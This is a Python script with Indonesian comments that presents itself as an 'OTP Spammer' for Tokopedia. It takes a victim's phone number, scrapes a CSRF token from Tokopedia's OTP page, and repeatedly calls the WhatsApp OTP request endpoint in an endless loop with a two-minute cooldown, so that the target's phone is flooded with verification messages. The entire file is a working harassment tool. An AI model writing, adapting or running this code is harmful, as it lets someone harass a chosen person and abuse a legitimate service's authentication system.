#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OTP Spammer - Tokopedia Only
User input nomor telepon, spam OTP WhatsApp Tokopedia berulang dengan cooldown 2 menit.
"""

import os
import re
import time
import sys
import random
import requests

os.system("clear")
# ===================== KONFIGURASI =====================

# Header & payload Tokopedia (sudah fix)
TOKOPEDIA_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "https://accounts.tokopedia.com/register",
    "Origin": "https://accounts.tokopedia.com",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
}

# ===================== FUNGSI =====================

def print_banner():
    print("""
    ╔═══════════════════════════════════════╗
    ║   ███████╗██████╗  █████╗ ███╗   ███╗ ║
    ║   ██╔════╝██╔══██╗██╔══██╗████╗ ████║ ║
    ║   ███████╗██████╔╝███████║██╔████╔██║ ║
    ║   ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ ║
    ║   ███████║██║     ██║  ██║██║ ╚═╝ ██║ ║
    ║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ ║
    ╚═══════════════════════════════════════╝
    """)
    print("\033[1;93m" + "=" * 48 + "\033[0m")
    print("\033[1;97m" + "     OTP Spammer".center(48) + "\033[0m")
    print("\033[1;93m" + "=" * 48 + "\033[0m")
    print()

def print_color(text, color="white", bold=False):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "white": "\033[97m",
        "reset": "\033[0m"
    }
    style = "\033[1m" if bold else ""
    print(f"{style}{colors.get(color, colors['white'])}{text}{colors['reset']}")

def clean_phone(raw):
    phone = re.sub(r'\D', '', raw)
    if phone.startswith('0'):
        phone = phone[1:]
    if len(phone) < 8:
        return None
    return phone

def get_phone():
    raw = input("📱 Masukkan nomor telepon (08xxx): ").strip()
    phone = clean_phone(raw)
    if not phone:
        print_color("❌ Nomor tidak valid!", "red")
        return get_phone()
    return phone

def send_tokopedia(phone):
    """
    Kirim OTP WhatsApp Tokopedia.
    phone: string nomor tanpa leading 0 (contoh: "8123456789")
    Return: (success, message)
    """
    session = requests.Session()
    session.headers.update(TOKOPEDIA_HEADERS)

    try:
        # Step 1: Ambil CSRF token dari halaman register
        register_url = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0{phone}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{phone}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D"
        resp = session.get(register_url, timeout=10)
        resp.raise_for_status()
        html = resp.text
        token_match = re.search(r'<input[^>]*id=["\']Token["\'][^>]*value=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if not token_match:
            return False, "Token tidak ditemukan"
        token = token_match.group(1)

        # Step 2: Kirim OTP
        payload = {
            "otp_type": "116",
            "msisdn": "0" + phone,
            "tk": token,
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        otp_url = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        resp = session.post(otp_url, data=payload, timeout=10)
        resp.raise_for_status()
        text = resp.text.lower()

        if "sukses" in text or "berhasil" in text or "success" in text:
            return True, "OTP WhatsApp terkirim"
        elif "anda sudah melakukan 3 kali pengiriman" in text:
            return False, "Limit 3x tercapai"
        else:
            return False, f"Respon tidak dikenali"
    except requests.exceptions.Timeout:
        return False, "Timeout koneksi"
    except requests.exceptions.ConnectionError:
        return False, "Gagal terhubung ke server"
    except Exception as e:
        return False, f"Error: {str(e)}"

def run_spam(phone):
    print_color(f"\n📱 Target: +62{phone}", "white")
    print_color("📋 Layanan: Tokopedia", "white")
    print()

    success, msg = send_tokopedia(phone)
    if success:
        print_color(f"[✅ Spam Tokopedia Terkirim] - {msg}", "green")
    else:
        print_color(f"[❌ Spam Tokopedia Gagal] - {msg}", "red")

def main():
    print_banner()
    phone = get_phone()

    confirm = input("\nLanjutkan spam? (y/n): ").strip().lower()
    if confirm != 'y':
        print_color("❌ Dibatalkan.", "red")
        return

    attempt = 1
    while True:
        print_color(f"\n🔥 SPAM SIKLUS KE-{attempt}", "yellow")
        run_spam(phone)

        # Cooldown 2 menit
        print_color("\n⏳ Cooldown 2 menit sebelum siklus berikutnya...", "yellow")
        for remaining in range(120, 0, -10):
            print(f"   {remaining} detik tersisa...", end="\r")
            sys.stdout.flush()
            time.sleep(10)
        print("   " + " " * 30, end="\r")
        sys.stdout.flush()

        attempt += 1

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_color("\n⏹️ Proses dihentikan oleh user.", "yellow")
    except Exception as e:
        print_color(f"\n❌ Terjadi error: {e}", "red")
